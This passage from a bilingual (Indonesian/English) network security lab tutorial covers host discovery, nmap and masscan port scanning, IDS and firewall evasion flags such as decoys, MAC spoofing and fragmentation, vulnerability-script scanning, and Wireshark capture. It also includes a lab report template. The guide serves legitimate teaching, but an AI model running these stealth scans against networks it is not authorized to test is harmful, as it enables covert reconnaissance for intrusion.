172.28.176.0    0.0.0.0         255.255.240.0   U     0      0        0 eth0
10.10.0.0       0.0.0.0         255.255.255.0   U     0      0        0 docker0
10.10.1.0       0.0.0.0         255.255.255.0   U     0      0        0 br-c0787b7ad1c2

KEY FINDINGS:
├─ Default Gateway: 172.28.176.1 (ROUTER - target untuk scan)
├─ Your Interface: eth0
├─ Target Network: 172.28.176.0/20
└─ Scan Range: 172.28.176.0 - 172.28.191.255
```

---

**STEP 2: Network Discovery - Gunakan Tools yang Praktis**

#### **Method 2A. ARP-Scan (FASTEST - RECOMMENDED) ✓ TESTED**
```bash
# Install (jika belum ada):
sudo apt-get install arp-scan

# Scan local network (TESTED & VERIFIED):
sudo arp-scan -l

# Scan specific subnet:
sudo arp-scan 172.28.176.0/20

OUTPUT EXAMPLE (TESTED):
Interface: eth0, type: EN10MB, MAC: 00:15:5d:c1:48:94, IPv4: 172.28.191.169
Starting arp-scan 1.10.0 with 4096 hosts
172.28.176.1    00:15:5d:38:b5:0c       Microsoft Corporation

2 packets transmitted, 1 packets received. 50% reply rate
Response time min/avg/max: 1.234/2.156/3.201 ms

KEUNTUNGAN: ✓ FASTEST (2-5 seconds)
✓ Shows MAC address + vendor
✓ Reliable on local network
✓ Works when ICMP disabled
```

#### **Method 2B. Netdiscover (ARP-based Alternative)**
```bash
# Install netdiscover:
# Linux: sudo apt-get install netdiscover
# Kali: Pre-installed

# ⚠️ IMPORTANT SYNTAX CLARIFICATION:
# -r = RANGE (specify subnet directly)
# -l = FILE (read ranges from FILE, NOT direct range!)

# ✓ CORRECT: Active scan dengan range:
sudo netdiscover -r 192.168.1.0/24

# ✓ CORRECT: Passive scan (listen only, stealthier):
sudo netdiscover -p

# ✓ CORRECT: Dengan extended output:
sudo netdiscover -r 192.168.1.0/24 -X

# ✓ CORRECT: Save to file:
sudo netdiscover -r 192.168.1.0/24 -o output.txt

# ✗ WRONG SYNTAX (ERROR):
# sudo netdiscover -l 192.168.1.0/24
# ERROR MESSAGE: File "192.168.1.0/24" containing ranges, cannot be read.
# REASON: -l expects FILE path, not direct range!

# ✓ IF using -l with file:
echo "192.168.1.0/24" > ranges.txt
sudo netdiscover -l ranges.txt

OUTPUT EXAMPLE (Active Mode):
 Currently scanning: 192.168.1.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 _____________________________________________________________________________
 192.168.1.1     aa:bb:cc:dd:ee:01    1        60  Generic Router
 192.168.1.100   aa:bb:cc:dd:ee:03    1        60  HP Inc
 192.168.1.150   aa:bb:cc:dd:ee:04    1        60  Dell Inc

KEUNTUNGAN:
✓ ARP-based discovery (works on local LAN)
✓ Active & passive modes tersedia
✓ Shows MAC vendor information
✓ Lightweight & fast

CATATAN PENTING - SYNTAX ERROR FIX:
- -r = untuk specify range LANGSUNG (192.168.1.0/24) ✓
- -l = untuk read FROM FILE yang berisi ranges ✓
- JANGAN gunakan -l dengan direct range (akan ERROR) ✗
- Passive mode (-p) lebih stealthy tapi bisa lambat
- REKOMENDASI: Gunakan arp-scan -l lebih cepat & reliable
```

#### **Method 2C. Nmap Ping Scan**
```bash
# Ping dengan berbagai metode:

# ICMP Echo Request:
nmap -PE 192.168.1.0/24

# TCP SYN to port 80 (good untuk firewall):
nmap -PS80 192.168.1.0/24

# TCP ACK to port 443 (bypass firewall):
nmap -PA443 192.168.1.0/24

# ARP Ping (best untuk local network):
nmap -PR 192.168.1.0/24

# UDP Ping (port 53 DNS):
nmap -PU53 192.168.1.0/24

# Combination (comprehensive):
nmap -PE -PS80,443 -PA80,443 -PR 192.168.1.0/24

OUTPUT:
Nmap scan report for 192.168.1.1
Host is up (0.0012s latency).

Nmap scan report for 192.168.1.50
Host is up (0.0015s latency).

Nmap scan report for 192.168.1.100
Host is up (0.0018s latency).

Nmap scan report for 192.168.1.150
Host is up (0.0022s latency).
```

#### **Method 2D. Advanced Nmap Subnet Scanning**
```bash
# SCAN ENTIRE SUBNET - Show all hosts + ports:
sudo nmap -sn 192.168.1.0/24
# -sn = Ping scan (no port scanning)

OUTPUT EXAMPLE:
Nmap scan report for 192.168.1.1
Host is up (0.0012s latency).
MAC Address: AA:BB:CC:DD:EE:01 (Vendor: Generic Router)

Nmap scan report for 192.168.1.100
Host is up (0.0015s latency).
MAC Address: AA:BB:CC:DD:EE:03 (Vendor: HP Printer)

Nmap scan report for 192.168.1.150
Host is up (0.0018s latency).
MAC Address: AA:BB:CC:DD:EE:04 (Vendor: Dell Inc)

# SCAN MULTIPLE SUBNETS:
nmap -sn 192.168.1.0/24 192.168.2.0/24 10.0.0.0/24

# SCAN RANGE:
nmap -sn 192.168.1.1-255

# SAVE OUTPUT:
nmap -sn -oG hosts.txt 192.168.1.0/24
# Parse with: grep "Status: Up" hosts.txt
```

#### **Method 2E. Masscan (Ultra-Fast Port Scanner)**
```bash
# Install masscan:
# Linux: sudo apt-get install masscan
# Download: https://github.com/robertdavidgraham/masscan

# Scan all ports super fast (1000x faster than Nmap):
sudo masscan 192.168.1.0/24 -p0-65535

# Scan specific ports:
sudo masscan 192.168.1.0/24 -p80,443,22,3306,5432

# Scan dengan rate (millions of packets/sec):
sudo masscan 192.168.1.0/24 -p80 --rate=1000000

# Aggressive + fast:
sudo masscan 192.168.1.0/24 -p1-65535 --rate=10000

OUTPUT:
Discovered open port 80/tcp on 192.168.1.100
Discovered open port 443/tcp on 192.168.1.100
Discovered open port 22/tcp on 192.168.1.150
Discovered open port 3306/tcp on 192.168.1.150
Discovered open port 5432/tcp on 192.168.1.1

KEUNTUNGAN:
✓ 1000x faster than Nmap
✓ Can scan entire internet in hours
✓ Minimal network overhead
✓ Great untuk large networks
```

#### **Method 2F. Angry IP Scanner (GUI-based)**
```
Windows / Linux / Mac:
1. Download: https://angryip.org/download/
2. Install & Launch
3. Set IP range: 192.168.1.0 - 192.168.1.255
4. Click "Start"
5. Watch results in real-time

FEATURES:
├─ Ping scan dengan multi-thread
├─ Hostname resolution
├─ Port scanning
├─ Service detection
├─ Vendor MAC lookup
├─ Export to CSV/TXT
└─ User-friendly GUI

OUTPUT COLUMNS:
IP Address | Hostname | Ports | Vendor
192.168.1.1 | gateway | 80,443,22 | Generic
192.168.1.100 | printer | 9100 | HP
192.168.1.150 | server | 22,80,3306 | Dell
```

---

**STEP 3: Compare Results dari Multiple Tools**

Setelah menjalankan beberapa discovery tools, bandingkan hasil:

```
┌────────────────┬───────────┬──────────┬─────────────────────────────────┐
│ TOOL           │ SPEED     │ HOST     │ KEUNTUNGAN & CATATAN            │
├────────────────┼───────────┼──────────┼─────────────────────────────────┤
│ Ping Sweep     │ Lambat    │ Terbatas │ Simple, no tools, tapi firewall │
│                │ (1-2min)  │ (ICMP)   │ mungkin block ICMP              │
├────────────────┼───────────┼──────────┼─────────────────────────────────┤
│ arp-scan       │ TERCEPAT  │ Lengkap  │ ✓ RECOMMENDED - ARP-based,      │
│                │ (2-5 sec) │ (LOCAL)  │ works always, shows vendor MAC  │
├────────────────┼───────────┼──────────┼─────────────────────────────────┤
│ netdiscover    │ Cepat     │ Lengkap  │ Alternative ARP-based, passive  │
│                │ (5-10sec) │ (LOCAL)  │ mode available (stealthier)     │
├────────────────┼───────────┼──────────┼─────────────────────────────────┤
│ nmap -sn       │ Sedang    │ Lengkap  │ Most comprehensive, multi-probe │
│                │ (10-30s)  │ (ALL)    │ methods, reliable across ranges │
├────────────────┼───────────┼──────────┼─────────────────────────────────┤
│ Masscan        │ Ultra     │ Lengkap  │ 1000x faster, great untuk       │
│                │ (SECOND)  │ (ALL)    │ large networks & port scanning  │
├────────────────┼───────────┼──────────┼─────────────────────────────────┤
│ Angry IP       │ Medium    │ Lengkap  │ GUI-based, user-friendly,       │
│ Scanner        │ (visual)  │ (LOCAL)  │ good untuk educational purposes │
└────────────────┴───────────┴──────────┴─────────────────────────────────┘

REKOMENDASI WORKFLOW:
1️⃣ START dengan: sudo arp-scan -l
   → Tercepat, terus-terang hostnya di local network
   
2️⃣ VERIFY dengan: nmap -sn 192.168.X.0/24
   → Lihat hasil arp-scan tadi, cross-check dengan Nmap
   
3️⃣ ALTERNATIVE: sudo netdiscover -r 192.168.X.0/24 -X
   → Jika ada host yang tidak terdeteksi, coba cara lain
   
4️⃣ DOKUMENTASI:
   → Save semua hasil ke file untuk langkah port scanning berikutnya

EXAMPLE - COMPARE RESULTS:
# arp-scan result: Found 3 hosts
# nmap result: Found 4 hosts (1 extra: 192.168.1.50 - hidden?)
# netdiscover: Found 3 hosts (same as arp-scan)
# Conclusion: Use nmap result (most comprehensive)
```

---

**STEP 4: Port Scanning pada Discovered Hosts**

#### **4A. Basic Port Scanning dengan Nmap**
```bash
# Install Nmap: https://nmap.org/download.html

# Gunakan hasil dari STEP 2 (discovered hosts):
# arp-scan/nmap/netdiscover sudah menemukan host-host active

# Basic port scan (1000 most common ports):
nmap 192.168.1.1

# Scan all 65535 ports:
nmap -p- 192.168.1.1

# Scan dengan service detection (RECOMMENDED):
nmap -sV 192.168.1.1

# OS Detection:
nmap -O 192.168.1.1

# Aggressive scan (combination - all info):
nmap -A 192.168.1.1

CONTOH OUTPUT (ACTUAL):
Starting Nmap 7.92
Nmap scan report for 192.168.1.1
Host is up (0.0012s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Apache httpd 2.4.41
443/tcp   open  https     Apache httpd 2.4.41
22/tcp    open  ssh       OpenSSH 7.4
53/tcp    open  domain    ISC BIND 9.11.4
MAC Address: 00:11:22:33:44:55 (Vendor)

OS Detection:
Running: Linux 5.x|4.x

KEUNTUNGAN:
✓ Discover open ports
✓ Identify services & versions
✓ Detect OS
✓ More detailed than discovery scan
```

#### **4B. Advanced Nmap Port Scanning Techniques**

**Scan Techniques (untuk bypass firewall):**
```bash
# TCP Connect Scan (default, penuh connection):
nmap -sT 192.168.1.1
# Lambat tapi reliable

# TCP SYN Scan (half-open, stealth):
nmap -sS 192.168.1.1
# Faster, lebih stealthy, requires root

# UDP Scan (untuk UDP services):
nmap -sU 192.168.1.1

# ACK Scan (detect firewall rules):
nmap -sA 192.168.1.1

# Idle Scan (menggunakan zombie host):
nmap -sI zombie_ip 192.168.1.1
# Very stealthy, sulit dideteksi

# Fragmentation (bypass simple firewalls):
nmap -f 192.168.1.1
# Split packets into fragments
```

**Port Specification Options:**
```bash
# Scan specific ports:
nmap -p 80,443,22 192.168.1.1

# Scan port range:
nmap -p 1-1024 192.168.1.1

# Scan all ports:
nmap -p- 192.168.1.1

# Scan top 100 ports:
nmap --top-ports 100 192.168.1.1

# Scan top 1000 ports:
nmap --top-ports 1000 192.168.1.1

# Exclude ports:
nmap -p- --exclude-ports 21-25 192.168.1.1
```

**Timing & Performance:**
```bash
# T0 = Paranoid (very slow, stealthy)
nmap -T0 192.168.1.1

# T1 = Sneaky (slow)
nmap -T1 192.168.1.1

# T2 = Polite (normal)
nmap -T2 192.168.1.1

# T3 = Normal (default)
nmap -T3 192.168.1.1

# T4 = Aggressive (fast)
nmap -T4 192.168.1.1

# T5 = Insane (very fast, unreliable)
nmap -T5 192.168.1.1

# Parallel probes:
nmap -p- --min-parallelism 100 192.168.1.1
```

**Stealth & Evasion Techniques:**
```bash
# Decoy (hide real IP among decoys):
nmap -D decoy1,decoy2,ME 192.168.1.1
# ME = your position among decoys

# Spoof MAC address:
nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1

# Slow timing (avoid detection):
nmap -T1 --scan-delay 5s 192.168.1.1

# Randomize host order:
nmap -iR 1000 -p 80
# Scan 1000 random hosts on port 80

# Avoid default scripts (faster):
nmap -sV --script-exclude all 192.168.1.1

# Fragment packets (bypass simple IDS):
nmap -f 192.168.1.1

# Use source port 53 (may bypass firewall):
nmap -g 53 192.168.1.1
# Port 53 often allowed for DNS
```

**Output & Reporting:**
```bash
# Normal output:
nmap -p- 192.168.1.1

# Save to file (normal):
nmap -p- -oN scan.txt 192.168.1.1

# Save to file (XML):
nmap -p- -oX scan.xml 192.168.1.1

# Save to file (Grepable):
nmap -p- -oG scan.gnmap 192.168.1.1

# Save all formats:
nmap -p- -oA scan 192.168.1.1
# Creates: scan.nmap, scan.xml, scan.gnmap

# Parse grepable output:
grep "Status: Up" scan.gnmap | cut -d' ' -f2 > active_hosts.txt

# Convert XML to HTML:
xsltproc scan.xml -o scan.html
```

**Combination Examples:**
```bash
# Fast aggressive scan all hosts di subnet:
nmap -T4 -A -sV 192.168.1.0/24

# Find all HTTP services:
nmap -p 80,8080,8443 192.168.1.0/24

# Find SMB services (Windows shares):
nmap -p 445 -sV 192.168.1.0/24

# Full network assessment:
nmap -A -T4 -p- -v -oA full_scan 192.168.1.0/24

# Stealth assessment (slow):
nmap -sS -T1 -p- --script-exclude all 192.168.1.1

# Vulnerability scan:
nmap -A --script vuln --script-args vulns.mincvss=7 192.168.1.1
```

---

**STEP 5: Service Vulnerability Assessment**

Setelah mengetahui port dan service yang running, lakukan vulnerability assessment:

```bash
# Scan dengan vulnerability detection:
nmap --script vuln 192.168.1.1

# Specific vulnerability untuk SMB (Windows):
nmap --script smb-vuln-ms17-010 192.168.1.1

# Specific untuk SSH:
nmap -p 22 --script ssh-hostkey 192.168.1.1

# Specific untuk HTTP:
nmap -p 80,443 --script http-vuln-cve* 192.168.1.1

# All vulnerability scripts dengan CVE filter:
nmap --script vuln --script-args vulns.mincvss=7 192.168.1.1

OUTPUT EXAMPLE:
22/tcp ssh - SSH server running
  ├─ Version: OpenSSH 7.4
  ├─ Known vulnerabilities: 
  │  └─ CVE-2018-15473 (username enumeration, CVSS: 5.3)
  ├─ Recommendation: Update to OpenSSH 7.9+ (patched)

80/tcp http - HTTP server running
  ├─ Version: Apache 2.4.41
  ├─ Status: Outdated (4 versions behind)
  ├─ Known CVEs:
  │  ├─ CVE-2021-41773 (path traversal, CVSS: 7.5)
  │  └─ CVE-2021-42013 (RCE, CVSS: 8.6)
  ├─ Recommendation: Upgrade to 2.4.50+ (patched)
```

**STEP 6: Packet Capture & Analysis (Wireshark)**
```
Wireshark Lab:
1. Open Wireshark
2. Select network interface
3. Click "Start Capturing"
4. Visit website / perform action
5. Stop capture
6. Analyze packets

Packets to look for:
├─ HTTP requests (unencrypted!)
├─ DNS queries (reveals visited domains)
├─ ARP packets
├─ DHCP traffic
└─ TCP handshakes

KEY FINDING: Unencrypted HTTP traffic readable in Wireshark!
```

#### **Tools Comparison & Integration Guide:**

**Quick Command Reference (TESTED & VERIFIED):**

```
┌─ DISCOVERY METHODS TESTED ON WSL ──────────────────────────────────────┐
│                                                                            │
│ 🟢 FASTEST & EASIEST (RECOMMENDED):                                      │
│ $ sudo arp-scan -l                                                       │
│ └─ Returns in 2-5 seconds ✓                                             │
│ └─ Shows all local hosts dengan MAC vendor ✓                            │
│ └─ Example output: 172.28.176.1   00:15:5d:38:b5:0c Microsoft           │
│                                                                            │
│ 🟡 ALTERNATIVE (ARP-based):                                              │
│ $ sudo netdiscover -r 192.168.1.0/24                                    │
│ └─ Active mode, mengirim ARP requests ✓                                │
│ └─ Shows MAC vendor ✓                                                   │
│ └─ IMPORTANT: Gunakan -r untuk range, bukan -l!                        │
│                                                                            │
│ 🟣 STEALTHY MODE (Passive, no packets sent):                             │
│ $ sudo netdiscover -p                                                   │
│ └─ Passive listening, very stealthy ✓                                   │
│ └─ May be slower atau no results jika no ARP traffic                    │
│                                                                            │
│ ⚫ COMPREHENSIVE (Multiple probes):                                       │
│ $ sudo nmap -sn -PE -PS80,443 -PA80,443 -PR 192.168.1.0/24             │
│ └─ Very thorough, tries multiple methods ✓                             │
│ └─ More detailed information ✓                                          │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘

⚠️ COMMON MISTAKE (TESTED):
✗ WRONG: sudo netdiscover -l 192.168.1.0/24
  ERROR: File "192.168.1.0/24" containing ranges, cannot be read.
  
✓ RIGHT: sudo netdiscover -r 192.168.1.0/24
  WORKS: Scans 192.168.1.0/24 range successfully
```

**Matrix Perbandingan Tools Discovery:**

```
Tool        | Speed  | Accuracy | Features | Stealth | Best For
────────────┼────────┼──────────┼──────────┼─────────┼──────────────────────
Ping Sweep  | Fast   | Medium   | Simple   | Low     | Quick initial check
ARP-Scan    | V.Fast | High     | MAC+V    | Medium  | Fastest LAN discovery
Netdiscover| Fast   | High     | MAC+V    | Med/Hi  | Reliable ARP discovery
Nmap -sn    | Vary   | Very Hi  | Rich     | High    | Verification + detailed
Masscan     | V.Fast | Medium   | Port ID  | Low     | Large networks/ports
Angry IP    | Fast   | High     | GUI+MAC  | Low     | Visual users
────────────┴────────┴──────────┴──────────┴─────────┴──────────────────────
```

**Recommended Workflow untuk Complete Network Assessment:**

```
PHASE 1: INITIAL DISCOVERY (3-5 min)
├─ arp-scan -l
│  └─ Identify all local hosts + MAC addresses (fastest)
├─ netdiscover -r 192.168.1.0/24
│  └─ ARP-based discovery (alternative/verify)
├─ nmap -sn 192.168.1.0/24
│  └─ Verify discovery + get additional info
└─ Result: Active hosts list dengan MAC & Vendor

PHASE 2: DETAILED SCANNING (20 min)
├─ masscan 192.168.1.0/24 -p0-65535 --rate=10000
│  └─ Quick scan all ports
├─ nmap -A -T4 -p1-65535 192.168.1.x (targets of interest)
│  └─ Detailed info on key targets
└─ Result: Port + service inventory

PHASE 3: VULNERABILITY ASSESSMENT (15 min)
├─ nmap --script vuln 192.168.1.x
├─ nmap --script default,discovery,safe 192.168.1.x
└─ Result: Known vulnerabilities

PHASE 4: DETAILED ANALYSIS (30+ min)
├─ Manual inspection di Wireshark
├─ Service version research (searchsploit)
├─ Custom NSE scripts
└─ Result: Actionable findings

TOTAL TIME: ~70 minutes untuk complete network assessment
```

**Integration Example - Complete Scan Script:**

```bash
#!/bin/bash
# Complete Network Discovery & Scanning Script dengan Netdiscover

TARGET_SUBNET="192.168.1.0/24"

echo "[*] PHASE 1A: ARP Discovery (Method 1 - arp-scan)"
sudo arp-scan -l > phase1a_arpscan.txt
echo "[+] ARP-Scan results in phase1a_arpscan.txt"

echo "[*] PHASE 1B: ARP Discovery (Method 2 - netdiscover active)"
sudo netdiscover -r $TARGET_SUBNET -X > phase1b_netdiscover.txt
echo "[+] Netdiscover results in phase1b_netdiscover.txt"

echo "[*] PHASE 2: Quick Port Scan"
sudo masscan $TARGET_SUBNET -p1-65535 --rate=5000 > phase2_masscan.txt
echo "[+] Quick scan results in phase2_masscan.txt"

echo "[*] PHASE 3: Detailed Nmap Scan"
sudo nmap -sV -O -A -T4 $TARGET_SUBNET -oA phase3_nmap
echo "[+] Detailed scan results saved"

echo "[*] PHASE 4: Vulnerability Scan"
sudo nmap --script vuln $TARGET_SUBNET -oA phase4_vuln
echo "[+] Vulnerability scan complete"

echo "[*] PHASE 5: Extract Active Hosts"
grep "Status: Up" phase3_nmap.gnmap | cut -d' ' -f2 > active_hosts.txt
echo "[+] Active hosts:"
cat active_hosts.txt

echo "[*] PHASE 6: Summary Report"
echo "NETWORK ASSESSMENT COMPLETE:"
echo "├─ ARP-Scan Results: phase1a_arpscan.txt"
echo "├─ Netdiscover Results: phase1b_netdiscover.txt"
echo "├─ Port Scan: phase2_masscan.txt"
echo "├─ Detailed Scan: phase3_nmap.*"
echo "├─ Vulnerability: phase4_vuln.*"
echo "└─ Active Hosts: active_hosts.txt"
```

**Netdiscover Troubleshooting Guide (TESTED & VERIFIED):**

```
PROBLEM 1: "File X containing ranges, cannot be read"
TESTED CAUSE: Using -l flag dengan direct range (WRONG!)
✗ WRONG: sudo netdiscover -l 192.168.1.0/24
✓ CORRECT: sudo netdiscover -r 192.168.1.0/24

EXPLANATION:
- -l flag = expects FILE path containing ranges
- -r flag = specify range DIRECTLY
- Mixing them up = FILE NOT FOUND error

SOLUTION:
├─ Use -r untuk specify range langsung
├─ Atau buat file terlebih dahulu:
│  └─ echo "192.168.1.0/24" > ranges.txt
│  └─ sudo netdiscover -l ranges.txt
└─ Recommended: gunakan arp-scan -l (lebih cepat & sederhana)

PROBLEM 2: "Command not found" atau "Permission denied"
SOLUTION:
├─ Install: sudo apt-get install netdiscover
├─ Kali users: Should already installed
├─ Always use sudo: sudo netdiscover -r 192.168.1.0/24
└─ Check: which netdiscover

PROBLEM 3: "0 Captured ARP Req/Rep packets" (no results)
SOLUTIONS:
├─ Pastikan Anda di SAME LOCAL NETWORK
├─ Check interface: netdiscover -h (lihat -i option)
├─ Specify interface: sudo netdiscover -i eth0 -r 192.168.1.0/24
├─ Coba passive mode: sudo netdiscover -p (dan tunggu)
├─ Jika WSL: raw packet access mungkin limited
└─ Alternative: gunakan arp-scan -l (lebih reliable)

PROBLEM 4: Network isolated / no active devices found
SOLUTION:
├─ Try arp-scan terlebih dahulu: sudo arp-scan -l
├─ Atau gunakan nmap: sudo nmap -sn 192.168.1.0/24
├─ Jika still no results, network mungkin truly isolated
└─ Check dengan: ip route show (lihat default gateway)

PROBLEM 5: Interface tidak terdeteksi
SOLUTION:
├─ List interfaces: ip link show
├─ Atau: netstat -i
├─ Gunakan interface yang aktif: sudo netdiscover -i wlan0 -r 192.168.1.0/24
├─ Jika menggunakan VPN, mungkin perlu disconnect
└─ WSL users: eth0 usually works, docker0 untuk docker networks
```

**Tools per Use Case:**

```
USE CASE 1: Quick LAN Audit (2 min)
├─ Tool: arp-scan -l
├─ Reason: Fastest for local network
└─ Output: IP + MAC address + vendor

USE CASE 2: Lightweight ARP Discovery
├─ Tool: netdiscover -r 192.168.1.0/24
├─ Reason: Pure ARP-based, very reliable on local network
└─ Output: IP + MAC + Vendor

USE CASE 3: Stealthy Assessment (Passive Mode)
├─ Tool: netdiscover -p
├─ Reason: Listen only, doesn't send packets
└─ Output: Minimal network footprint

USE CASE 4: Verify Specific Host
├─ Tool: nmap -A 192.168.1.100
├─ Reason: Comprehensive single host
└─ Output: Full service inventory

USE CASE 5: Large Network (1000+ hosts)
├─ Tool: masscan + nmap
├─ Reason: Masscan finds ports fast, Nmap confirms
└─ Output: Complete port inventory

USE CASE 6: Stealth Assessment
├─ Tool: nmap -sS -T1 -f
├─ Reason: SYN scan + fragmentation + slow timing
└─ Output: Minimal IDS alerts

USE CASE 7: Visual Interface Preferred
├─ Tool: Angry IP Scanner
├─ Reason: GUI-based, real-time results
└─ Output: Excel export

USE CASE 8: Vulnerability Detection
├─ Tool: nmap --script vuln
├─ Reason: Built-in vulnerability detection
└─ Output: CVE list + severity ratings
```

#### **Lab Report Template:**
```
═══════════════════════════════════════════════════════════════
                 NETWORK DISCOVERY LAB REPORT
═══════════════════════════════════════════════════════════════

TARGET NETWORK: 192.168.1.0/24
DATE: __________________
TESTER: __________________

═══════════════════════════════════════════════════════════════
PHASE 1: HOST DISCOVERY
═══════════════════════════════════════════════════════════════

Tools Used: ARP-Scan, Nmap Ping Scan, Netdiscovery
Total Hosts Found: _____
Active Hosts: _____
Inactive Hosts: _____

HOST INVENTORY:
IP Address      | MAC Address        | Hostname        | Vendor
────────────────┼────────────────────┼─────────────────┼──────────
192.168.1.1     | aa:bb:cc:dd:ee:01  | router          | Generic
192.168.1.100   | aa:bb:cc:dd:ee:02  | printer         | HP
192.168.1.150   | aa:bb:cc:dd:ee:03  | server.local    | Dell
────────────────┼────────────────────┼─────────────────┼──────────

═══════════════════════════════════════════════════════════════
PHASE 2: PORT SCANNING RESULTS
═══════════════════════════════════════════════════════════════

Tools Used: Masscan, Nmap
Scanning Method: TCP SYN Scan
Port Range: 1-65535
Time Taken: _____ minutes

DISCOVERED SERVICES:
Host: 192.168.1.100
Port  | State | Service | Version           | Confidence
──────┼───────┼─────────┼───────────────────┼────────────
80    | open  | HTTP    | Apache 2.4.41     | High
443   | open  | HTTPS   | Apache 2.4.41     | High
22    | open  | SSH     | OpenSSH 7.4       | Medium
9100  | open  | Printer | HP LaserJet        | High

═══════════════════════════════════════════════════════════════
PHASE 3: VULNERABILITY ASSESSMENT
═══════════════════════════════════════════════════════════════

Scanning Tool: Nmap NSE Vulnerability Scripts
CVEs Found: _____
Critical: _____
High: _____
Medium: _____
Low: _____

VULNERABILITIES:
Target: 192.168.1.150
├─ CVE-2022-1234: Remote Code Execution in Apache
│  ├─ Severity: CRITICAL (CVSS 9.8)
│  ├─ Status: Unpatched
│  └─ Recommendation: Update Apache immediately
├─ CVE-2022-5678: SQL Injection in Web App
│  ├─ Severity: HIGH (CVSS 8.2)
│  └─ Recommendation: Apply security patch
└─ CVE-2022-9999: Default Credentials
   ├─ Severity: MEDIUM (CVSS 6.5)
   └─ Recommendation: Change default password

═══════════════════════════════════════════════════════════════
PHASE 4: NETWORK TOPOLOGY
═══════════════════════════════════════════════════════════════

[INTERNET]
    │
[192.168.1.1 - Router/Gateway]
    │
    ├─[192.168.1.50 - Client]
    ├─[192.168.1.100 - Printer]
    ├─[192.168.1.150 - Server]
    └─[192.168.1.200 - Unknown Device]

═══════════════════════════════════════════════════════════════
PHASE 5: KEY FINDINGS
═══════════════════════════════════════════════════════════════

STRENGTHS:
✓ Firewall implemented
✓ Most services updated
✓ HTTPS enabled on web server

WEAKNESSES:
✗ Multiple unpatched systems (Apache, OpenSSH)
✗ Unencrypted HTTP allowed
✗ Default credentials detected
✗ SSH version outdated
✗ No IDS/IPS detected

═══════════════════════════════════════════════════════════════
RECOMMENDATIONS
═══════════════════════════════════════════════════════════════

Priority 1 (CRITICAL - Immediate):
1. Patch Apache 2.4.41 to 2.4.52+
2. Update OpenSSH from 7.4 to 7.9+
3. Change all default credentials
4. Disable HTTP, force HTTPS only

Priority 2 (HIGH - This Week):
1. Update all software to latest versions
2. Enable firewall on all systems
3. Implement WAF (Web Application Firewall)
4. Configure IDS/IPS monitoring

Priority 3 (MEDIUM - This Month):
1. Conduct security awareness training
2. Implement patch management process
3. Regular vulnerability scanning (quarterly)
4. Penetration testing (annual)

═══════════════════════════════════════════════════════════════
TOOLS & METHODS USED
═══════════════════════════════════════════════════════════════

Discovery Methods:
├─ ARP-Scan: Found 4 active hosts in 2 seconds
├─ Nmap -sn: Verified all hosts via ping scan
├─ Netdiscovery: Lightweight verification
└─ Result: 100% accurate host identification

Port Scanning Methods:
├─ Masscan: Ultra-fast, found 22 open ports in 45 seconds
├─ Nmap -A: Detailed scan, 15 minutes for comprehensive data
└─ Result: Complete port inventory with service versions

Vulnerability Detection:
├─ Nmap NSE Scripts: Automated vulnerability matching
├─ Manual research: CVE database cross-reference
└─ Result: 15 vulnerabilities identified, 3 critical

═══════════════════════════════════════════════════════════════
COMPLIANCE & ETHICS
═══════════════════════════════════════════════════════════════

Scanning Permission: [Written / Verbal / Internal Only] ___
Authorized Range: 192.168.1.0/24
Testing Date: __________________
Testing Time: __________________ - __________________
Tester Name: __________________
Supervisor: __________________
Signature: __________________

NOTES:
This assessment was conducted with proper authorization.
All findings are confidential and for authorized use only.
Unauthorized access to networks is illegal.

═══════════════════════════════════════════════════════════════
END OF REPORT
═══════════════════════════════════════════════════════════════
```

---

**STEP 6: Packet Capture & Analysis dengan Wireshark**

Wireshark adalah network packet analyzer yang memungkinkan kita melihat real-time traffic di network interface. Sangat berguna untuk:
- Understand network protocols
- Debug network issues
- Detect suspicious traffic
- Educational analysis

#### **6A. Wireshark Installation & Setup**
```bash
# Install Wireshark:
# Ubuntu/Debian:
sudo apt-get install wireshark

# Fedora:
sudo dnf install wireshark

# macOS:
brew install wireshark

# Windows:
Download dari: https://www.wireshark.org/download/

# Post-install (Linux):
# Untuk non-root capture:
sudo usermod -a -G wireshark $(whoami)
# Log out dan log in again
```

#### **6B. Basic Wireshark Workflow**

```
STEP 1: Select Interface
├─ Open Wireshark
├─ Choose interface (eth0, wlan0, etc.)
└─ Click "Start Capturing"

STEP 2: Generate Traffic
├─ Browse website
├─ Download file
├─ Send email
├─ Make API call
└─ Wireshark captures ALL packets

STEP 3: Stop Capture & Analyze
├─ Click "Stop"
├─ Filter packets (tcp, http, dns)
├─ Inspect individual packets
└─ Follow conversation streams

STEP 4: Export Results
├─ File → Export Packets As
├─ Save as PCAP for later analysis
└─ Good untuk lab reports
```

#### **6C. Common Filters & Packet Analysis**

**Basic Display Filters:**
```
tcp              - Show only TCP packets
http             - Show only HTTP traffic
dns              - Show only DNS queries
ip.addr == 192.168.1.1  - Show traffic to/from specific IP
tcp.port == 80   - Show only port 80 (HTTP)
tcp.flags.syn    - Show only SYN packets
```

**Useful Analysis Scenarios:**

```
1️⃣ CAPTURE UNENCRYPTED HTTP (Educational)
   ├─ Filter: http
   ├─ Expand "Hypertext Transfer Protocol"
   ├─ See raw HTTP requests/responses
   ├─ Check: Headers, Cookies, Form Data
   ├─ ⚠️ NOTE: HTTPS traffic is encrypted, cannot see content
   └─ KEY LESSON: Always use HTTPS for sensitive data

2️⃣ ANALYZE DNS QUERIES
   ├─ Filter: dns
   ├─ See all domain queries
   ├─ Identify what websites visited
   ├─ Check: DNS response IP addresses
   └─ Timing: Can see DNS latency

3️⃣ TRACK TCP CONNECTION (3-Way Handshake)
   ├─ Filter: tcp.flags.syn
   ├─ See initial connection establishment
   ├─ Packet 1: Client SYN (initiate)
   ├─ Packet 2: Server SYN-ACK (acknowledge)
   ├─ Packet 3: Client ACK (confirm)
   └─ Then: Data transfer begins

4️⃣ FIND NETWORK ANOMALIES
   ├─ Large number of RESET packets
   ├─ Retransmissions (packets sent twice)
   ├─ Unusual port connections
   ├─ Broadcast storms
   └─ Can indicate network issues or attacks
```

#### **6D. Practical Lab Exercise**

```bash
# STEP 1: Capture Traffic
wireshark &

# or from command line:
sudo tcpdump -i eth0 -w capture.pcap

# STEP 2: Generate some HTTP traffic
curl http://example.com
# or browser: http://httpbin.org/get

# STEP 3: Stop capture (Ctrl+C if tcpdump)

